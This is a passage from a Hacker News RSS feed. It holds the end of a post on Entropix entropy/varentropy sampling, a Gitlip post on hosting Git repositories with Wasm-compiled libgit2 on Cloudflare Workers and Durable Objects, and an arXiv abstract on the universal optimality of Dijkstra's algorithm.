stretchy="false">)</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mo stretchy="false">[</mo><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">H = -\sum_{x \in X} P(x)\log_2(P(x)) = E[I(x)]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3717em;vertical-align:-1.3217em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8557em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3217em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)]</span></span></span></span></span></div><p>Varentropy is calculated as the variance of the surprisal:</p><div data-testid="react-katex"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>V</mi><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>+</mo><mi>H</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>=</mo><mi>E</mi><mo stretchy="false">[</mo><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">V = \sum_{x \in X} P(x)(\log_2(P(x)) + H)^2 = E[(I(x) - H)^2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3717em;vertical-align:-1.3217em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8557em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3217em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mopen">(</span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">[(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span></span></div><p>High varentropy indicates that some of the values are highly different from others - in other words, some outcomes are much more surprising than others relative to the average surprisal (entropy).</p></template><!--astro:end--></astro-island>
<p>Combined, the two of us give 4 possible states:</p>
<ul>
<li>Low entropy, low varentropy: A very peaked distribution (one highly probable outcome).</li>
<li>Low entropy, high varentropy: A distribution with a few disparate peaks.</li>
<li>High entropy, low varentropy: A uniform or near-uniform distribution.</li>
<li>High entropy, high varentropy: A spread-out but uneven distribution.</li>
</ul>
<h2 id="adaptive-sampling-based-on-entropy--varentropy">Adaptive Sampling based on Entropy &amp; Varentropy</h2>
<p>Now that we have those metrics for uncertainty, we can use them to perform different types of sampling based on the situation.</p>
<h3 id="low-entropy-low-varentropy">Low Entropy, Low Varentropy</h3>
<p><img src="https://www.thariq.io/images/entropix/lowe-lowv.png" alt="Low entropy, low varentropy"></p><p>This is usually the ideal case. The model is certain not only in what its first option would be, but also what it would choose if the first option was incorrect. Often times this means that the list is ordered in a neat way.</p>
<p>In this case, adaptive sampling would suggest the standard argmax sampling, e.g. choose the token with the highest probabilitly.</p>
<h3 id="low-entropy-high-varentropy">Low Entropy, High Varentropy</h3>
<p><img src="https://www.thariq.io/images/entropix/lowe-highv.png" alt="Low entropy, high varentropy"></p><p>In this case, the model predicts a few options very highly.</p>
<p>This is a tricky case- it may be representing a whole new branch of output, or it may be representing a few options such as a synonym.</p>
<p>In this case, we may want to “<strong>branch</strong>” by predicting both logits, seeing what paths they take and comparing the results after some point. There are many ways to implement this branching, which deserves its own post.</p>
<p>Depending on the results of the branching, we could take different actions. If we get two branches with fairly equal confidence (as measured by their entropy and varentropy) but with different contents, we could formulate this as a question to the user.</p>
<h3 id="high-entropy-low-varentropy">High Entropy, Low Varentropy</h3>
<p><img src="https://www.thariq.io/images/entropix/highe-lowv.png" alt="High entropy, low varentropy"></p><p>This state represents a possible low confidence state in the model. It may be seeing something that it doesn’t recognize at all, or all the options may be interchangeable with each other.</p>
<p>The best thing to do here is to help the model get to a higher confidence state. Entropix suggests using a <strong>“thinking” token</strong> here as the next token, e.g. <em>“Wait..”</em></p>
<p>A thinking token is a token that we insert into the output, to make the model realizes it needs to spend more compute time thinking about the answer before giving one.</p>
<p>For example, if the model is predicting <em>“The capital of Germany is Paris”</em> but it is not sure about the answer, it might insert a thinking token and predict <em>“The capital of Germany is Paris… Wait, no, it’s actually Berlin”</em></p>
<h3 id="high-entropy-high-varentropy">High Entropy, High Varentropy</h3>
<p><img src="https://www.thariq.io/images/entropix/highe-highv.png" alt="High entropy, high varentropy"></p><p>The model has no clear favorite, but it is more certain in some outputs than others. This is a difficult place to be in. One way to think about is that any of the top options may be solid choices (e.g. they are synonyms to each other), and so we should just choose one at random (aka a higher temperature).</p>
<p>We could also branch, or insert thinking tokens like we have done in previous options.</p>
<h2 id="branching-vs-thinking-tokens">Branching vs Thinking Tokens</h2>
<p>Branching &amp; thinking tokens are two different ways of achieving more compute in an uncertain state.</p>
<p>Branching predictions involves following a few logits to see what other tokens they lead to. This is often called MCTS (Monte Carlo Tree Search) and is a method that has been often tried in LLMs to middling success. One of the tradeoffs of branching is that it requires using inference compute in a way where the branches cannot benefit from each others compute.</p>
<p>Thinking tokens are a way of achieving more compute in an uncertain state without sacrificing some of that compute to explore a branch that you might kill. Inserting “Wait…” causes the AI to realize that it might have made a mistake.</p>
<p>Branching vs thinking tokens is overall an open research question, and deserving of another post.</p>
<h2 id="attention-entropy">Attention Entropy</h2>
<p>It’s worth noting that there are other measures of entropy that we might take into account. Entropix uses them slightly to figure out how to modify temperature, but they might be other tools.</p>
<p><strong>Attention Entropy</strong> - How much are your attention heads tend to follow specific tokens, vs pay attention to a large number of tokens in the context.</p>
<p><strong>Attention Agreement</strong> - How much your attention heads are paying attention to the same tokens as each other, vs different ones.</p>
<p>If your heads have low entropy and high agreement, that can be another signal for you to be confident sampling the highest probability. Low agreement might indicate that different heads are contributing to different predictions, and it might be worth branching.</p>
<h2 id="does-this-matter">Does this matter?</h2>
<p>The insights in Entropix feel in many ways fairly easy to understand, and not entirely novel, which has been surprising to many.</p>
<p>Even if the evals don’t show a large benefit yet. But, inference-time techniques like this are easy to experiment with and could be a promising direction for open source hackers to improve reasoning without huge budgets.</p>  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Infinite Git repos on Cloudflare workers (138 pts)]]></title>
            <link>https://gitlip.com/blog/infinite-git-repos-on-cloudflare-workers</link>
            <guid>41947513</guid>
            <pubDate>Fri, 25 Oct 2024 17:34:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gitlip.com/blog/infinite-git-repos-on-cloudflare-workers">https://gitlip.com/blog/infinite-git-repos-on-cloudflare-workers</a>, See on <a href="https://news.ycombinator.com/item?id=41947513">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>How we built a scalable Git server on Cloudflare Workers using WebAssembly and Durable Objects.</p><div><div><p>We’re building<!-- --> <a href="https://gitlip.com/">Gitlip</a> <!-- -->- the collaborative devtool for the AI era. An all-in-one combination of Git-powered version control, collaborative coding and 1-click deployments. Our goal is to simplify the practical application of state-of-the-art AI models.</p><p>We’re preparing to raise a seed round soon. Reach out to<!-- --> <a href="https://x.com/nataliemarleny">@nataliemarleny</a> <!-- -->for more information.</p></div><p>In this post we will describe how we implemented infinite Git repos on Cloudflare using a new type of serverless database: a highly optimized Webassembly Git server that runs on Cloudflare Workers and scales horizontally. It allows us to easily host an infinite number of repositories. Additionally, since it runs on Cloudflare our Git server supports IPv6 by default. For comparison,<!-- --> <a href="https://github.com/orgs/community/discussions/10539">GitHub doesn’t yet support IPv6</a>.</p><p>Currently we are leveraging this technology to build a coding platform. We’re also considering creating a serverless Database as a Service (DBaaS) offering, which would allow anyone to create an arbitrary number of Git repositories in the cloud and use them in their own product. If you’d be interested in a DBaaS product like this, please reach out to<!-- --> <a href="https://x.com/nataliemarleny">@nataliemarleny</a>!</p><h3>Motivation</h3><p>Originally, while working on a note-taking application for developers based on Git, we encountered the need to host Git repositories efficiently. Wanting to avoid managing the servers ourselves, we experimented with a serverless approach. After researching, we couldn’t find anyone attempting something similar, so besides its potential usefulness, it also seemed like an interesting problem to solve.</p><p>We’re big fans of Cloudflare and their Workers platform and we were aware of<!-- --> <a href="https://developers.cloudflare.com/durable-objects/">Durable Objects</a>. In terms of the usage model, likely access patterns, and general philosophy, Durable Objects seemed like the perfect underlying storage for a project like this.</p><p>We consider Durable Objects a novel and revolutionary type of storage. It offers a key-value store that is transactional, strongly consistent, and persistent. It’s tightly integrated with the Workers runtime and is suitable for all sorts of coordination and application-data use cases. Given its usefulness, we fully expect that other cloud providers will offer a comparable type of storage alongside their serverless offerings in the future.</p><p>When we started our research, we knew that Cloudflare had built D1 (their SQLite database offering) on Durable Objects. In addition to our early experiments with Durable Objects, this made us confident that what we intended to implement was feasible, so we made it our goal to host a Git repository within a Durable Object.</p><h3>Git in Cloudflare Workers</h3><p>Cloudflare Workers is a serverless platform based on the V8 JavaScript engine, which can also execute Wasm binaries, so when attempting to run Git in this environment, we had somewhat limited options. We tried a few different approaches, but in the end, there were only two legitimate candidates:</p><ol><li><a href="https://github.com/libgit2/libgit2">libgit2</a> <!-- -->- a cross-platform, linkable Git library written in C,</li><li><a href="https://github.com/isomorphic-git/isomorphic-git">isomorphic-git</a> <!-- -->- a pure JavaScript implementation of Git.</li></ol><p>We judged that it would be easier to start with isomorphic-git, but that the initial up-front investment in making libgit2 work might pay off more significantly, since libgit2 is used much more widely and is more battle-hardened. Prior to our attempts, other developers had already made libgit2 work in Node.js and browsers (see<!-- --> <a href="https://github.com/petersalomonsen/wasm-git">wasm-git</a>), which further encouraged us that we were on the right path.</p><p>We ended up compiling libgit2 with Emscripten and packaging it for Cloudflare Workers.</p><p>Git uses the filesystem as its underlying storage, so the next step was to implement a filesystem on top of Durable Objects. A big hurdle we encountered at this point was how I/O is handled in modern JavaScript (using promises or async/await) versus how filesystem I/O is expected to work in Emscripten (synchronous system calls). Emscripten offers two mechanisms for using asynchronous JavaScript function calls in synchronous C functions:<!-- --> <a href="https://emscripten.org/docs/porting/asyncify.html">JSPI and Asyncify</a>. After extensive research, we rewrote significant parts of Emscripten to support asynchronous file system calls. We ended up creating our own Emscripten filesystem on top of Durable Objects, which we call DOFS. Having a filesystem on Durable Objects is very useful for running a Git server, but it also unlocks many other interesting possibilities (we will write about this in the future).</p><p><img src="https://gitlip.com/images/blog/infinite-git-repos-on-cloudflare-workers/image-00.svg" alt=""></p><h3>Implementing a Git server</h3><p>Compiling libgit2 to Wasm and implementing a filesystem on top of Durable Objects was a good start, but we needed to do more work to make the entire project useful. At this point, our Git implementation in Cloudflare Workers could store a repo in a Durable Object and communicate with the outside world via custom HTTP operations (read file, list branches etc.), but it couldn’t communicate using the Git protocol, so we couldn’t use the Git command-line tool to fetch or push.</p><p>libgit2 is an excellent Git library, but it only provides client functionality; server functionality is missing. We couldn’t find any other implementations of Git server functionality on the web to use as a reference. While Git itself implements the server commands receive-pack and upload-pack, porting them to libgit2 proved impossible. The main reason was that the required server commands depended on numerous other source files, and the interfaces between these files appeared poorly defined. Edward Thomson, the maintainer of libgit2, has written<!-- --> <a href="https://www.edwardthomson.com/blog/libgit2-in-2024-the-past.html#and-then-theres-the-server">an excellent article on the history of libgit2</a>, detailing Git’s issues in more depth.</p><p>We abandoned the porting efforts and ended up implementing the missing Git server functionality ourselves by leveraging libgit2’s core functionality, studying all available documentation, and painstakingly investigating Git’s behavior. We also created an extensive integration test suite to ensure the robustness and performance of our Git server.</p><h3>Reproducible builds</h3><p>Compiling native libraries like libgit2 for a specific target platform requires a significant amount of preparation, especially when the library itself needs to be compiled with a modified version of the compiler. We found it cumbersome to maintain the repeatability of the entire build process by manually invoking build commands for each component. Luckily, amazing software built for this exact purpose already exists - enter<!-- --> <a href="https://nixos.org/">Nix</a>, a declarative, purely functional build system which enables reproducible builds.</p><p>We’ve built our build system by utilizing Nix. This allowed us to reproducibly build patched Emscripten, patched libgit2, and the C implementation of our Git server from scratch by invoking just a single command. Not only that, but Nix has also enabled us to fine-tune this build process and make it configurable with flags passed to the build command. We can now build our Git server from scratch targeting the native platform (Linux or Mac), Node.js, or Cloudflare Workers. We can also easily configure whether we want the release or development build of the entire package tree. Additionally, Nix allows us to build only a subtree of packages, enabling us to intervene mid-build to make necessary modifications. The learning curve for Nix is steep, but well worth it. If you’re interested in a similarly powerful tool that’s easier to get started with,<!-- --> <a href="https://flox.dev/">flox is an excellent option</a>.</p><p>We discovered a beautiful, initially unintended consequence of building our package tree with Nix: with a little bit of effort, we could compile a broad array of interesting native libraries to WebAssembly using our modified Emscripten compiler. So far, we’ve compiled zlib, libarchive, and libmagic to Wasm and statically linked them with our Git server. As a result, our Git server can create archives in many different formats (we currently only use zip and tar.gz) and easily detect MIME types for a vast array of stored files.<!-- --> <a href="https://github.com/NixOS/nixpkgs">Nixpkgs</a> <!-- -->is full of Nix scripts for building various software packages, and it was reasonably straightforward to adjust some of them to build to Wasm.</p><p>Finally, we also compiled<!-- --> <a href="https://bellard.org/quickjs/">QuickJS</a> <!-- -->to Wasm using our Nix build system. We use our QuickJS-based service to run JavaScript files with full support for ES modules’ import/export statements in Cloudflare Workers on-demand (more in the next section).</p><h3>Composable capabilities</h3><p>One of the core design principles in our codebase is to invest effort in building powerful, composable capabilities and curate them carefully in our repository. Having a strong set of these capabilities opens up interesting combinations especially when using a platform like Cloudflare Workers, which makes composition easy.</p><p><span>Example #1:</span> We developed our Git server with the intention of serving a single repository from a Durable Object, but after accomplishing this, it was very easy to package the same HTTP endpoints and Wasm and expose it from a plain Worker instead of a Durable Object. This way, we gained the ability to run the same exact Git code in either a persistent context (clients connect to the same Durable Object) or an ephemeral context (clients connect to any Worker closest to them). There are use cases where executing Git functionality in an ephemeral context is useful, and where sending the request to a Durable Object would be the wrong choice. For example, when validating a branch or tag name in the Web UI, there’s no need to reimplement these Git-specific rules in JavaScript if we can expose the exact upstream libgit2 behavior in the ephemeral Worker closest to the Web UI user.</p><p><span>Example #2:</span> If you visit<!-- --> <a href="https://gitlip.com/@nataliemarleny/test-repo/ref/HEAD/main.js">https://gitlip.com/@nataliemarleny/test-repo/ref/HEAD/main.js</a>, you’ll see an option to execute this file by pressing ’play’ on the right. Alternatively, here’s a quick video:</p><p><video height="200" width="100%" controls=""><source src="https://gitlip.com/images/blog/infinite-git-repos-on-cloudflare-workers/video-00.mp4" type="video/mp4">Your browser does not support the video tag.</video></p><p>Several of our composable capabilities work together to achieve the final result:</p><ol><li>api receives the request to execute main.js from the HEAD of the repo.</li><li>api coordinates the services (using<!-- --> <a href="https://developers.cloudflare.com/workers/runtime-apis/bindings/service-bindings/">service bindings</a>).</li><li>git-server service receives a request for an archive of the HEAD of the repo and streams the tar.gz snapshot of the HEAD back to the api.</li><li>api forwards the tar.gz stream to the js-run service (QuickJS-based).</li><li>js-run service unpacks the archive stream into memory.</li><li>js-run service runs the requested file from memory (note that main.js imports fizzbuzz.js!) and streams the response back to the api.</li><li>api streams the response back to the user.</li></ol><p><img src="https://gitlip.com/images/blog/infinite-git-repos-on-cloudflare-workers/image-01.svg" alt=""></p><p>For now, executing JavaScript in an on-demand manner like this is just a showcase of what we can easily achieve with our stack of capabilities, but in the future, we plan to make this more powerful by adding support for importing NPM modules and more.</p><h3>Optimizations</h3><p>Achieving predictable performance from our Git server required applying several optimization techniques. We’ll outline the most important ones.</p><p>Like any other serverless platform, Cloudflare Workers come with their own<!-- --> <a href="https://developers.cloudflare.com/workers/platform/limits/">set of constraints</a>. For the purposes of running a Git server, the most important ones are the Worker size (total size of the deployed code), memory, and CPU limit.</p><p><a href="https://blog.cloudflare.com/workers-pricing-scale-to-zero/">In September 2023</a>, the Worker size limit on the Paid plan was increased from 1MB to 10MB, but Cloudflare still recommends keeping your entire deployment under 1MB for best performance. Our Wasm Git server, along with libgit2, all other libraries, and JavaScript glue code, fits in just 800kB, which we consider to be quite an achievement. We achieved this primarily by optimizing for code size during compilation and trimming the number of file formats our libmagic utility can detect.</p><p>The runtime limit of 128MB of memory initially posed a challenge. libgit2 makes heavy use of memory mapping when reading or writing objects to Git packfiles. Unfortunately, in a Wasm application compiled with Emscripten, memory mapping requires a completely new copy of the file in memory (even if the file is already in memory). This meant our Git server would copy the entire Git packfile into memory when reading even the smallest objects, causing the server’s performance to depend on the packfile size rather than the object size. We attempted to address this by modifying Emscripten, but it proved too difficult, so we opted to modify libgit2 instead. We removed all mmap equivalents and replaced them with read/write equivalents, and the results were incredible. We achieved performance independent of the packfile (repo) size. Note that memory mapping makes total sense in the typical settings for which libgit2 was designed.</p><p>Durable Objects are single-threaded, so one might think it would be difficult to efficiently serve concurrent requests to the same repository. Fortunately, the access patterns to a Git repository are well-suited for optimization with a cache. For this purpose we created a component called ConsistentCache, which wraps around Cloudflare’s HTTP Cache API (available in every Worker and Durable Object) and adds the necessary consistency guarantees. This component also deduplicates calls to the Git Wasm program, issuing a single call and relaying the response to all requestors in parallel. Using this technique, a significant number of requests to the Git server are fulfilled directly from the cache, and any modification to the repository purges this cache consistently.</p><p>Persistent storage in Durable Objects<!-- --> <a href="https://blog.cloudflare.com/durable-objects-easy-fast-correct-choose-three/#part-3-automatic-in-memory-caching">has its own built-in caching layer</a>, which improves overall performance and provides additional consistency guarantees. Unfortunately, all reads that hit this built-in cache are billed the same as accessing the underlying storage. libgit2 specifically, and Git more generally, often need to read small chunks of a file incrementally, resulting in a large number of small reads, which became somewhat expensive during testing. We decided to implement our own storage cache, called StorageEngine, and completely disable the built-in cache. This way, we pay nothing for most of the operations our Git server performs on DOFS, only incurring costs for the occasional flush that writes all inodes and file blocks to storage and for occasional reads that populate the StorageEngine.</p><p>Finally, we optimized the implementation of our bare Git repositories to always contain a very limited (mostly constant) number of directories. This allowed us to preload all directories and pack-index files from the persistent storage (depending on the repo between 20 and 60, each up to a few kB in size) every time the Durable Object is instantiated, effectively pre-warming the repository for any Git command it might receive.</p><pre><code>(log) StorageEngine.get (1/1): [HTTP_CACHE_LRU_MAP]
(log) StorageEngine.get (4/4): [NNID, ..., PRECACHE]
(log) StorageEngine.get (48/48): [N_1, ..., B_463_0]
(log) StorageEngine.get (0/1): [N_1]
(log) StorageEngine.get (0/1): [N_2]
(log) StorageEngine.get (0/1): [N_350]
(log) StorageEngine.get (0/1): [N_3]
(log) StorageEngine.get (0/1): [N_6]
(log) StorageEngine.get (0/1): [N_349]
(log) StorageEngine.get (0/1): [B_349_0]
(log) StorageEngine.get (0/1): [N_10]
(log) StorageEngine.get (0/1): [B_350_0]
(log) StorageEngine.get (0/1): [N_7]
(log) StorageEngine.get (0/1): [N_463]
(log) StorageEngine.get (0/1): [B_463_0]
(log) StorageEngine.get (0/1): [N_5]
(log) StorageEngine.get (0/1): [N_25]
(log) StorageEngine.get (0/1): [N_24]
(log) StorageEngine.get (0/1): [N_4]
(log) StorageEngine.get (0/1): [B_25_0]
... previous line repeated 263 more times
(log) StorageEngine.get (1/1): [B_24_0]
(log) StorageEngine.get (1/1): [B_24_15]
(log) StorageEngine.get (0/1): [B_25_0]
(log) StorageEngine.get (1/1): [B_24_9]
(log) StorageEngine.get (0/1): [B_24_9]
(log) StorageEngine.get (0/1): [B_25_0]
... previous line repeated 8 more times
(log) StorageEngine.get (1/1): [B_24_10]
(log) StorageEngine.get (0/1): [B_24_10]
(log) StorageEngine.get (0/1): [B_24_9]
... previous line repeated 10 more times
(log) StorageEngine.get (0/1): [B_24_10]
(log) StorageEngine.get (0/1): [B_25_0]
... previous line repeated 8 more times
(log) StorageEngine.get (1/1): [B_24_12]
(log) StorageEngine.get (0/1): [B_24_12]
... previous line repeated 30 more times
(log) StorageEngine._syncBufferFinal START
(log) StorageEngine.put (1): [HTTP_CACHE_LRU_MAP]
(log) StorageEngine._syncBufferFinal END
(log) StorageEngine._syncBufferFinal START
(log) StorageEngine._syncBatchPut (1): [HTTP_CACHE_LRU_MAP]
(log) StorageEngine._syncBufferFinal END</code></pre><p>The optimizations above, along with a few others, ensure that the performance of our Git servers is both reasonable and reliable. Small read and write operations (think a typical README.md) over HTTP complete in under 150 ms, even without caching and regardless of the repository size.</p><h3>Limitations</h3><p>For now, our Git server is well-suited for repositories up to about 100 MB in size, which is more than enough for our specific use case. Beyond 100 MB, we encounter a few issues:</p><ol><li>Single-threaded packing and unpacking of Git packfiles during clone, fetch, and push operations exceeds the time limit on requests to Workers if the packfiles are too large.</li><li><a href="https://github.com/whatwg/fetch/issues/1254">Fetch body streams are not full duplex</a>, which unfortunately means that while we can theoretically clone and push any repository in our Git server, we may not be able to fetch from it. This is because the fetch operation in Git’s smart protocol requires a full duplex channel for negotiating the optimal packfile to send. Fortunately, in repositories with up to 32 refs, this negotiation process never occurs.</li><li>Cloudflare Workers support only HTTPs for now - so we can’t support cloning, fetching and pushing over SSH without meaningfully complicating our infrastructure.</li></ol><p>We believe the above limitations are solvable in the long term, and that in the future, we could adjust our Git server to handle repositories of arbitrary size and support SSH.</p><h3>Demo</h3><p>To preview this in production, feel free to explore our Gitlip public profiles:</p><ol><li><a href="https://gitlip.com/@nataliemarleny">https://gitlip.com/@nataliemarleny</a></li><li><a href="https://gitlip.com/@plesiv">https://gitlip.com/@plesiv</a></li></ol><p>Please note that the current performance is constrained by the fact that our primary database is not hosted on Cloudflare, and calls to it dominate the latency of most requests. We expect to reduce the overall latency of most requests by 50% to 75% through further optimizations, which we’ll write about in the future.</p><h3>Future</h3><p>Having a serverless and infinitely horizontally scalable Git server infrastructure opens many possibilities for products built on top of it. We believe Git is underutilized for storage purposes, given its versioning capabilities and the fact that it stores plain files, which can be in any format suitable for the application.</p><p>An additional benefit of achieving a performant Git server in JavaScript and Wasm is the fact that our server already mostly works directly in the browser itself. This opens up exciting possibilities: imagine having a lightweight Git client as part of a<!-- --> <a href="https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps">PWA</a> <!-- -->which can shallowly clone a remote repository to allow local editing even when offline. We plan to explore this further down the line.</p><h3>Conclusion</h3><p>We’re just getting started! Stay up to date with our journey of building<!-- --> <a href="https://gitlip.com/">Gitlip</a> <!-- -->by following<!-- --> <a href="https://x.com/nataliemarleny">@nataliemarleny</a>.</p><p>None of this would be possible without the amazing open-source software and the even more amazing communities and companies that produce it, most notably: libgit2, Emscripten, Nix, and the Cloudflare Workers platform. We’re very grateful to work with such incredible tools.</p><p>Thanks to Edward Thomson (<a href="https://x.com/ethomson">@ethomson</a>), Sunil Pai (<a href="https://x.com/threepointone">@threepointone</a>), Chris Nicholas (<a href="https://x.com/ctnicholasdev">@ctnicholasdev</a>) and Tim Neutkens (<a href="https://x.com/timneutkens">@timneutkens</a>) for reading drafts of this post.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Universal optimality of Dijkstra via beyond-worst-case heaps (177 pts)]]></title>
            <link>https://arxiv.org/abs/2311.11793</link>
            <guid>41947355</guid>
            <pubDate>Fri, 25 Oct 2024 17:19:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2311.11793">https://arxiv.org/abs/2311.11793</a>, See on <a href="https://news.ycombinator.com/item?id=41947355">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2311.11793">View PDF</a>
    <a href="https://arxiv.org/html/2311.11793v2">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>This paper proves that Dijkstra's shortest-path algorithm is universally optimal in both its running time and number of comparisons when combined with a sufficiently efficient heap data structure.
<br>Universal optimality is a powerful beyond-worst-case performance guarantee for graph algorithms that informally states that a single algorithm performs as well as possible for every single graph topology. We give the first application of this notion to any sequential algorithm.
<br>We design a new heap data structure with a working-set property guaranteeing that the heap takes advantage of locality in heap operations. Our heap matches the optimal (worst-case) bounds of Fibonacci heaps but also provides the beyond-worst-case guarantee that the cost of extracting the minimum element is merely logarithmic in the number of elements inserted after it instead of logarithmic in the number of all elements in the heap. This makes the extraction of recently added elements cheaper.
<br>We prove that our working-set property is sufficient to guarantee universal optimality, specifically, for the problem of ordering vertices by their distance from the source vertex: The locality in the sequence of heap operations generated by any run of Dijkstra's algorithm on a fixed topology is strong enough that one can couple the number of comparisons performed by any heap with our working-set property to the minimum number of comparisons required to solve the distance ordering problem on this topology.
    </blockquote>

